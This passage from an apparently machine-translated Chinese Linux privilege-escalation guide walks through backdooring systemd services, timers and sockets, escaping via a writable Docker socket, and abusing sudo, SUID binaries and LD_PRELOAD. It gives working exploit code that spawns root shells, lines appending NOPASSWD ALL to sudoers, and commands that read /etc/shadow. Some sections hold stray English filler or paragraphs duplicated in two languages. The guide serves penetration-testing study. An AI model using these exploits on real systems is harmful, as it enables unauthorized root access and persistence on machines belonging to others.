#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你可以**修改它**，使其在服务**启动**、**重新启动**或**停止**时**执行**你的后门（也许你需要等待机器重启）。
例如，在 .service 文件中创建你的后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你对服务执行的二进制文件具有**写权限**，你可以将它们更改为后门，这样当服务被重新执行时，后门将被执行。

### systemd 路径 - 相对路径

你可以使用以下命令查看 **systemd** 使用的路径：
```bash
systemctl show-environment
```
如果你发现你可以在路径的任何文件夹中进行**写入**操作，那么你可能能够**提升权限**。你需要搜索服务配置文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可以写入的systemd PATH文件夹中创建一个与相对路径二进制文件同名的**可执行文件**，当服务被要求执行易受攻击的操作（**启动**，**停止**，**重新加载**）时，你的**后门将被执行**（通常非特权用户无法启动/停止服务，但请检查是否可以使用`sudo -l`）。

**使用`man systemd.service`了解更多关于服务的信息。**

## **定时器**

**定时器**是以`**.timer**`结尾的systemd单元文件，用于控制`**.service**`文件或事件。**定时器**可以作为cron的替代品，因为它们内置了对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以使用以下命令列举所有的定时器：
```bash
systemctl list-timers --all
```
### 可写定时器

如果你可以修改一个定时器，你可以让它执行一些已存在的systemd.unit（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中，您可以了解到什么是Unit：

> 当此计时器到期时要激活的Unit。参数是一个Unit名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器Unit具有相同名称的Service（除了后缀）。建议激活的Unit名称和计时器Unit的Unit名称相同，除了后缀（参见上文）。

因此，要滥用此权限，您需要：

* 找到一些systemd unit（例如`.service`），它正在**执行一个可写的二进制文件**
* 找到一些systemd unit，它正在**执行一个相对路径**，并且您对**systemd PATH**具有**可写权限**（以冒充该可执行文件）

**通过`man systemd.timer`了解更多关于计时器的信息。**

### **启用计时器**

要启用计时器，您需要root权限并执行以下操作：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
请注意，通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建符号链接来激活**计时器**。

## 套接字

简而言之，Unix套接字（技术上正确的名称是Unix域套接字，**UDS**）允许在同一台机器或不同机器上的客户端-服务器应用程序框架中的两个不同进程之间进行通信。更准确地说，它是使用标准Unix描述符文件在计算机之间进行通信的一种方式（来自[这里](https://www.linux.com/news/what-socket/)）。

可以使用`.socket`文件配置套接字。

**使用`man systemd.socket`了解更多关于套接字的信息**。在此文件中，可以配置几个有趣的参数：

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项不同，但概括起来用于**指示它将在何处监听**套接字（AF_UNIX套接字文件的路径、要监听的IPv4/6和/或端口号等）。
* `Accept`：接受一个布尔值参数。如果为**true**，则为每个传入连接**生成一个服务实例**，并且只传递连接套接字给它。如果为**false**，则所有监听套接字本身都**传递给启动的服务单元**，并且为所有连接生成一个服务单元。对于数据报套接字和FIFO，其中一个服务单元无条件处理所有传入流量，此值将被忽略。**默认为false**。出于性能原因，建议仅以适合`Accept=no`的方式编写新的守护程序。
* `ExecStartPre`、`ExecStartPost`：接受一个或多个命令行，在创建和绑定监听**套接字**/FIFO之前或之后**执行**。命令行的第一个标记必须是绝对文件名，然后是进程的参数。
* `ExecStopPre`、`ExecStopPost`：在关闭和删除监听**套接字**/FIFO之前或之后**执行**的附加**命令**。
* `Service`：指定在**传入流量**上**激活**的**服务**单元名称。此设置仅允许用于`Accept=no`的套接字。默认为与套接字同名的服务（后缀替换）。在大多数情况下，不需要使用此选项。

### 可写的`.socket`文件

如果找到一个**可写的**`.socket`文件，您可以在`[Socket]`部分的开头添加类似于`ExecStartPre=/home/kali/sys/backdoor`的内容，这样在创建套接字之前将执行后门。因此，您可能需要等待机器重启。\
请注意，系统必须使用该套接字文件配置，否则后门将不会被执行。

### 可写的套接字

如果您**发现任何可写的套接字**（现在我们谈论的是Unix套接字，而不是配置的`.socket`文件），那么您可以与该套接字进行通信，可能利用其中的漏洞。

### 枚举Unix套接字
```bash
netstat -a -p --unix
```
### 原始连接

Establishing a raw connection is a technique used in privilege escalation to gain higher levels of access on a target system. It involves establishing a direct connection to the target system without going through any intermediary services or protocols.

To establish a raw connection, you can use tools like `netcat` or `socat`. These tools allow you to create a network connection and interact with the target system directly.

Once you have established a raw connection, you can execute commands on the target system with the privileges of the user account used to establish the connection. This can be useful for bypassing security measures and gaining unauthorized access to sensitive information or performing malicious actions.

It is important to note that establishing a raw connection may be detected by intrusion detection systems or monitored by system administrators. Therefore, it is crucial to use this technique responsibly and only in authorized scenarios, such as during penetration testing or when conducting security assessments.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**漏洞利用示例：**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP套接字

请注意，可能有一些**监听HTTP请求的套接字**（_我指的不是.socket文件，而是充当Unix套接字的文件_）。您可以使用以下命令进行检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果套接字**响应一个HTTP**请求，那么你可以**与它进行通信**，也许可以**利用一些漏洞**。

### 可写的Docker套接字

**Docker套接字**通常位于`/var/run/docker.sock`，只有`root`用户和`docker`组有写权限。\
如果由于某种原因**你对该套接字拥有写权限**，你可以提升权限。\
以下命令可用于提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### 使用无需docker包的docker web API套接字

如果您可以访问**docker套接字**但无法使用docker二进制文件（可能甚至未安装），您可以直接使用`curl`使用web API。

以下命令是一个示例，演示如何**创建一个挂载主机系统根目录的docker容器**，并使用`socat`在新的docker中执行命令。
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
最后一步是使用 `socat` 启动与容器的连接，发送一个 "attach" 请求。
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
现在，您可以通过这个`socat`连接在容器上执行命令。

### 其他

请注意，如果您具有对docker套接字的写权限，因为您在`docker`组内，您有[**更多提升权限的方法**](interesting-groups-linux-pe/#docker-group)。如果[docker API正在监听一个端口，您也可以利用它进行攻击](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下链接中查看有关**更多从docker中逃脱或滥用它提升权限的方法**：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr)提权

如果您发现可以使用**`ctr`**命令，请阅读以下页面，因为**您可能能够滥用它来提升权限**：

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC**提权

如果您发现可以使用**`runc`**命令，请阅读以下页面，因为**您可能能够滥用它来提升权限**：

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus是一个**进程间通信（IPC）系统**，提供了一个简单而强大的机制，**允许应用程序相互通信**、交换信息和请求服务。D-Bus从头开始设计，以满足现代Linux系统的需求。

作为一个功能齐全的IPC和对象系统，D-Bus有几个预期的用途。首先，D-Bus可以执行基本的应用程序IPC，允许一个进程将数据传输给另一个进程-类似于**功能强化的UNIX域套接字**。其次，D-Bus可以通过系统发送事件或信号，允许系统中的不同组件进行通信，并最终更好地集成。例如，蓝牙守护程序可以发送一个来电信号，您的音乐播放器可以拦截该信号，在通话结束之前静音音量。最后，D-Bus实现了一个远程对象系统，允许一个应用程序从不同的对象请求服务和调用方法-类似于没有复杂性的CORBA。（来自[这里](https://www.linuxjournal.com/article/7744)）。

D-Bus使用**允许/拒绝模型**，其中每个消息（方法调用、信号发射等）可以根据与之匹配的所有策略规则的总和进行**允许或拒绝**。策略中的每个规则应该设置`own`、`send_destination`或`receive_sender`属性。

`/etc/dbus-1/system.d/wpa_supplicant.conf`策略的一部分：
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
因此，如果策略以任何方式允许您的用户与总线进行交互，您可能能够利用它来提升权限（也许只是查找一些密码？）。

请注意，**未指定**任何用户或组的策略会影响所有人（`<policy>`）。\
对于上下文为"default"的策略，会影响未受其他策略影响的所有人（`<policy context="default"`）。

**在此了解如何枚举和利用 D-Bus 通信：**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **网络**

枚举网络并确定机器的位置总是很有趣。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

在访问之前，始终检查无法与之交互的机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### 嗅探

检查是否可以嗅探流量。如果可以，你可能能够获取一些凭据。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查你是**谁**，你拥有哪些**特权**，系统中有哪些**用户**，哪些用户可以**登录**，哪些用户拥有**root特权**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些Linux版本受到了一个bug的影响，允许具有**UID > INT\_MAX**的用户提升权限。更多信息：[这里](https://gitlab.freedesktop.org/polkit/polkit/issues/74)，[这里](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)和[这里](https://twitter.com/paragonsec/status/1071152249529884674)。\
使用以下方法**利用它**：**`systemd-run -t /bin/bash`**

### 组

检查是否是**某个组的成员**，该组可能授予您root权限：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能的话）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key elements to consider when implementing a password policy:

- **Password Complexity**: Require passwords to be a combination of uppercase and lowercase letters, numbers, and special characters. This makes it harder for attackers to guess or crack passwords.

- **Password Length**: Set a minimum password length to ensure that passwords are not easily guessable. A longer password is generally more secure.

- **Password Expiration**: Enforce regular password changes to reduce the risk of compromised passwords. Users should be prompted to change their passwords after a certain period of time.

- **Password History**: Prevent users from reusing their previous passwords. This helps ensure that compromised passwords cannot be reused.

- **Account Lockout**: Implement an account lockout policy to protect against brute-force attacks. After a certain number of failed login attempts, the account should be locked for a specified period of time.

- **Two-Factor Authentication**: Consider implementing two-factor authentication (2FA) to add an extra layer of security. This requires users to provide a second form of verification, such as a code sent to their mobile device, in addition to their password.

By implementing a strong password policy, you can significantly enhance the security of your system and protect against unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，尝试使用密码登录每个用户。

### Su暴力破解

如果不介意制造很多噪音，并且计算机上存在`su`和`timeout`二进制文件，你可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)来暴力破解用户。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)使用`-a`参数也可以尝试暴力破解用户。

## 可写的PATH滥用

### $PATH

如果你发现你可以**在$PATH的某个文件夹中写入内容**，你可以通过在可写文件夹中创建一个名为将由不同用户（最好是root）执行的某个命令的后门来提升权限，而该命令**不是从位于你的可写文件夹之前的文件夹中加载的**。

### SUDO和SUID

你可能被允许使用sudo执行某些命令，或者它们可能具有suid位。使用以下命令进行检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些意外的命令允许您读取和/或写入文件，甚至执行命令。例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo配置可能允许用户在不知道密码的情况下以另一个用户的特权执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户`demo`可以以`root`身份运行`vim`，现在只需将一个ssh密钥添加到根目录或调用`sh`即可轻松获得一个shell。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某个操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个例子，基于HTB机器Admirer，存在PYTHONPATH劫持漏洞，可以在以root权限执行脚本时加载任意Python库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### 绕过路径执行Sudo

**跳转**到其他文件或使用**符号链接**。例如，在sudoers文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用了通配符（\*），那就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**：[https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 未指定命令路径的Sudo命令/SUID二进制文件

如果给予一个单独的命令**sudo权限而没有指定路径**：_hacker10 ALL= (root) less_，你可以通过更改PATH变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
这种技术也可以用于**suid**二进制文件**在不指定路径的情况下执行另一个命令（始终使用**_**strings**_**检查奇怪的SUID二进制文件的内容）**。

[执行的有效载荷示例。](payloads-to-execute.md)

### 带有命令路径的SUID二进制文件

如果**suid**二进制文件**指定路径执行另一个命令**，那么你可以尝试**导出一个函数**，函数名与suid文件调用的命令相同。

例如，如果一个suid二进制文件调用了_**/usr/sbin/service apache2 start**_，你需要尝试创建并导出该函数：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用suid二进制文件时，这个函数将被执行。

### LD\_PRELOAD和**LD\_LIBRARY\_PATH**

**LD\_PRELOAD**是一个可选的环境变量，包含一个或多个共享库或共享对象的路径，加载器将在任何其他共享库之前加载它们，包括C运行时库(libc.so)。这被称为预加载库。

为了防止这种机制被用作_suid/sgid_可执行二进制文件的攻击向量，如果_ruid != euid_，加载器将忽略_LD\_PRELOAD_。对于这样的二进制文件，只有标准路径中也是_suid/sgid_的库才会被预加载。

如果你在**`sudo -l`**的输出中找到句子：_**env\_keep+=LD\_PRELOAD**_，并且你可以使用sudo调用某些命令，你可以提升权限。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令进行**编译**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，运行**提升权限**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
如果攻击者控制**LD\_LIBRARY\_PATH**环境变量，那么类似的权限提升攻击可以被滥用，因为攻击者可以控制库文件的搜索路径。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID二进制文件 - .so注入

如果你发现一些具有**SUID**权限的奇怪二进制文件，你可以检查所有的**.so**文件是否**正确加载**。为了这样做，你可以执行以下命令：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，如果你发现类似这样的内容：_pen("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)_，你可以利用它。

创建文件 _/home/user/.config/libcalc.c_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
使用以下命令进行编译：
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## 共享对象劫持

Shared Object Hijacking (SOH) is a technique used to escalate privileges on a Linux system by exploiting the way dynamic libraries are loaded. When a program is executed, it may depend on certain shared libraries to function properly. These libraries are loaded dynamically at runtime.

共享对象劫持（SOH）是一种利用动态库加载方式的技术，用于在Linux系统上提升权限。当执行一个程序时，它可能依赖于某些共享库以正常运行。这些库在运行时动态加载。

An attacker can take advantage of this by placing a malicious shared object in a directory that is searched by the system's dynamic linker/loader. When the target program is executed, the malicious shared object is loaded instead of the legitimate one, allowing the attacker to execute arbitrary code with the privileges of the target program.

攻击者可以利用这一点，在系统的动态链接器/加载器搜索的目录中放置一个恶意共享对象。当执行目标程序时，恶意共享对象会被加载，而不是合法的对象，从而允许攻击者以目标程序的权限执行任意代码。

To perform a shared object hijacking attack, the attacker needs to identify a target program that loads shared libraries dynamically and determine the directories searched by the dynamic linker/loader. Once these directories are identified, the attacker can place a malicious shared object with the same name as the legitimate one in one of these directories.

要执行共享对象劫持攻击，攻击者需要识别一个动态加载共享库的目标程序，并确定动态链接器/加载器搜索的目录。一旦确定了这些目录，攻击者可以在其中一个目录中放置一个与合法对象同名的恶意共享对象。

When the target program is executed, the dynamic linker/loader will search for the shared object in the directories in a specific order. If the attacker's malicious shared object is found first, it will be loaded instead of the legitimate one, giving the attacker control over the execution of the target program.

当执行目标程序时，动态链接器/加载器将按照特定顺序在目录中搜索共享对象。如果攻击者的恶意共享对象首先被找到，它将被加载，而不是合法的对象，从而使攻击者能够控制目标程序的执行。

To prevent shared object hijacking, it is important to ensure that only trusted directories are searched by the dynamic linker/loader. This can be achieved by properly configuring the system's library search path and removing unnecessary or insecure directories from the search path.

为了防止共享对象劫持，重要的是确保只有受信任的目录被动态链接器/加载器搜索。可以通过正确配置系统的库搜索路径，并从搜索路径中删除不必要或不安全的目录来实现这一点。
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到了一个SUID二进制文件，它从一个我们可以写入的文件夹中加载库。让我们在该文件夹中创建一个具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到以下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个名为`a_function_name`的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)是一个精选的Unix二进制文件列表，攻击者可以利用这些二进制文件来绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/)是相同的，但仅适用于只能在命令中注入参数的情况。

该项目收集了Unix二进制文件的合法函数，可以被滥用以打破受限制的shell、提升或保持提升的特权、传输文件、生成绑定和反向shell，并促进其他后渗透任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

如果你可以访问`sudo -l`，你可以使用工具[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)来检查是否找到了如何利用任何sudo规则的方法。

### 重用Sudo令牌

在以下场景中，**你作为一个具有sudo特权的用户拥有一个shell**，但你不知道该用户的密码，你可以**等待他/她使用`sudo`执行某个命令**。然后，你可以**访问使用sudo的会话的令牌，并使用它来执行任何sudo命令**（特权升级）。

提升特权的要求：

* 你已经作为用户"_sampleuser_"拥有一个shell
* "_sampleuser_"在**过去的15分钟内使用了`sudo`**来执行某些操作（默认情况下，这是sudo令牌的持续时间，允许我们在不输入任何密码的情况下使用`sudo`）
* `cat /proc/sys/kernel/yama/ptrace_scope`的值为0
* 可以访问`gdb`（你可以上传它）

（你可以使用`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`临时启用`ptrace_scope`，或者永久修改`/etc/sysctl.d/10-ptrace.conf`并设置`kernel.yama.ptrace_scope = 0`）

如果满足所有这些要求，**你可以使用：**[**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* 第一个利用（`exploit.sh`）将在`/tmp`中创建二进制文件`activate_sudo_token`。你可以使用它来**在你的会话中激活sudo令牌**（你不会自动获得root shell，请执行`sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* 第二个漏洞利用 (`exploit_v2.sh`) 将在 _/tmp_ 目录下创建一个由 root 拥有并设置了 setuid 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* 第三个漏洞利用 (`exploit_v3.sh`) 将创建一个 sudoers 文件，使 sudo 令牌永久有效，并允许所有用户使用 sudo。
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<用户名>

如果您对该文件夹或文件夹中的任何创建的文件具有**写权限**，您可以使用二进制文件[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools)来**为用户和PID创建sudo令牌**。\
例如，如果您可以覆盖文件_/var/run/sudo/ts/sampleuser_，并且您以该用户的PID 1234拥有一个shell，您可以通过以下方式**获取sudo特权**，而无需知道密码：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件`/etc/sudoers`和`/etc/sudoers.d`中的文件配置了谁可以使用`sudo`以及如何使用。这些文件**默认情况下只能被root用户和root组读取**。\
**如果**你能够**读取**这个文件，你可能能够**获取一些有趣的信息**，如果你能够**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你能写入，你可以滥用这个权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法是：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制文件的选择，比如适用于 OpenBSD 的 `doas`，请记得检查其配置文件位于 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo劫持

如果你知道一个用户通常连接到一台机器并使用`sudo`来提升权限，而且你在该用户的上下文中获得了一个shell，那么你可以创建一个新的sudo可执行文件，它将以root权限执行你的代码，然后执行用户的命令。然后，修改用户上下文的$PATH（例如在.bash_profile中添加新路径），这样当用户执行sudo时，你的sudo可执行文件就会被执行。

请注意，如果用户使用的是不同的shell（不是bash），你需要修改其他文件来添加新路径。例如[sudo-piggyback](https://github.com/APTy/sudo-piggyback)修改了`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)中找到另一个示例。

## 共享库

### ld.so

文件`/etc/ld.so.conf`指示加载的配置文件的位置。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着将读取`/etc/ld.so.conf.d/*.conf`中的配置文件。这些配置文件指向其他文件夹，其中将搜索库。例如，`/etc/ld.so.conf.d/libc.conf`的内容是`/usr/local/lib`。这意味着系统将在`/usr/local/lib`中搜索库。

如果由于某种原因，用户对所指示的任何路径（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`中的任何文件或`/etc/ld.so.conf.d/*.conf`中的配置文件内的任何文件夹）具有写权限，他可能能够提升权限。
在下面的页面中查看如何利用这个错误配置：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将lib复制到`/var/tmp/flag15/`中，程序将在此位置使用它，如`RPATH`变量中指定的那样。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在`/var/tmp`目录下使用`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`命令创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 权限提升

Linux的capabilities为进程提供了一部分可用的root权限。这有效地将root权限分解为更小且独立的单元。然后可以将这些单元独立地授予进程。这样可以减少完整权限集，降低利用风险。
阅读以下页面以了解更多关于capabilities以及如何滥用它们的信息：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## 目录权限

在一个目录中，“执行”位意味着受影响的用户可以进入该文件夹。
“读取”位意味着用户可以列出文件，“写入”位意味着用户可以删除和创建新文件。

## ACLs

ACL（访问控制列表）是离散权限的第二级，可能会覆盖标准的ugo/rwx权限。当正确使用时，它们可以为您设置对文件或目录的访问提供更好的细粒度控制，例如通过授予或拒绝对既不是文件所有者也不是组所有者的特定用户的访问权限（来自[这里](https://linuxconfig.org/how-to-manage-acls-on-linux)）。
给用户"kali"赋予对文件的读取和写入权限：
```bash
setfacl -m u:kali:rw file.txt
